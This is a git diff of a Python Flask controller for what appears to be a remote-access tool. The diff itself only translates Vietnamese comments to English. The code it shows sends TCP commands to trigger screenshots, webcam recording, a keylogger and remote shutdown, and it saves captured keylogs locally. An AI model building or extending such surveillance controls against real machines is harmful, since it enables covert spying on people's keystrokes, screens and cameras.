@@ -1,13 +1,13 @@
 from flask import Flask, render_template, request, jsonify, Response, send_file
 import socket, json, os, struct, io, time
-from datetime import datetime # Cần thêm lại thư viện này
+from datetime import datetime
 
 TCP_SERVER_IP = "127.0.0.1" 
 TCP_PORT = 5001
 
 app = Flask(__name__)
 
-# --- CONFIG ---
+# --- CONFIGURATION ---
 @app.route("/api/configure", methods=["POST"])
 def configure():
     global TCP_SERVER_IP, TCP_PORT
@@ -22,16 +22,16 @@ def get_conf(): return jsonify({"ip": TCP_SERVER_IP, "port": TCP_PORT})
 @app.route("/api/ping")
 def ping(): return jsonify({"status": "alive"})
 
-# --- CORE TCP ---
+# --- CORE TCP CLIENT ---
 def send_tcp(cmd, binary=False):
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.settimeout(10) # Tăng timeout lên 10s để nhận file lớn
+            s.settimeout(10) # 10s timeout for large file transfers
             s.connect((TCP_SERVER_IP, TCP_PORT))
             s.sendall(cmd.encode())
             
             if binary:
-                # Nhận dữ liệu binary (file, ảnh, video)
+                # Receive binary data (file, image, video)
                 size_data = s.recv(4)
                 if not size_data: return None
                 size = struct.unpack(">L", size_data)[0]
@@ -39,12 +39,12 @@ def send_tcp(cmd, binary=False):
                 
                 data = b""
                 while len(data) < size:
-                    packet = s.recv(min(40960, size - len(data))) # Buffer lớn hơn chút
+                    packet = s.recv(min(40960, size - len(data))) # Large buffer size
                     if not packet: break
                     data += packet
                 return data
             else:
-                # Nhận text thường
+                # Receive plain text response
                 data = b""
                 while True:
                     chunk = s.recv(4096)
@@ -53,7 +53,7 @@ def send_tcp(cmd, binary=False):
                 return data.decode(errors='ignore')
     except Exception as e: return None
 
-# --- RESTORED FUNCTIONS (KHÔI PHỤC TÍNH NĂNG) ---
+# --- LOCAL STORAGE OPERATIONS ---
 def save_screenshot_locally():
     try:
         img_data = send_tcp("download_screenshot", binary=True)
@@ -69,7 +69,7 @@ def save_screenshot_locally():
 
 def save_video_locally(seconds):
     try:
-        # Gửi lệnh quay và chờ Server quay xong rồi gửi file về
+        # Send record command, wait for Server, then receive file
         video_data = send_tcp(f"webcam_record {seconds}", binary=True)
         if not video_data: return "[ERROR] Failed to download video"
         
@@ -81,24 +81,23 @@ def save_video_locally(seconds):
         return f"Saved to: {os.path.abspath(filename)}"
     except Exception as e: return f"[ERROR] {e}"
 
-    # --- THÊM VÀO client.py ---
-
+# --- LOCAL KEYLOG SAVING ---
 @app.route("/api/save_keylog_local", methods=["POST"])
 def save_keylog_local():
     try:
         data = request.json
         content = data.get("content", "")
         
-        # Tạo thư mục keylog nếu chưa có
+        # Create keylog directory if not exists
         folder = "keylog"
         if not os.path.exists(folder):
             os.makedirs(folder)
             
-        # Tạo tên file theo thời gian
+        # Generate filename with timestamp
         filename = f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
         filepath = os.path.join(folder, filename)
         
-        # Ghi file
+        # Write file
         with open(filepath, "w", encoding="utf-8") as f:
             f.write(content)
             
@@ -172,18 +171,18 @@ def control():
     cmd = ""
     result = "Executed"
 
-    # Xử lý Screenshot (Lưu local)
+    # Handle Screenshot (Local Save)
     if act == "screenshot":
         result = save_screenshot_locally()
         return jsonify({"status": "ok" if "[ERROR]" not in result else "error", "message": result})
     
-    # Xử lý Webcam Record (Lưu local)
+    # Handle Webcam Record (Local Save)
     elif act == "webcam_record":
         seconds = d.get("seconds", 5)
         result = save_video_locally(seconds)
         return jsonify({"status": "ok" if "[ERROR]" not in result else "error", "message": result})
 
-    # Các lệnh khác
+    # Standard Commands
     map_cmd = {
         "keylog_start": "keylog_start", "keylog_stop": "keylog_stop", "keylog_clear": "keylog_clear",
         "shutdown": "shutdown", "restart": "restart"
@@ -200,7 +199,7 @@ def control():
 
     return jsonify({"status": "ok", "message": result})
 
-# --- PAGES ---
+# --- ROUTES ---
 @app.route("/")
 def index(): return render_template("index.html")
 
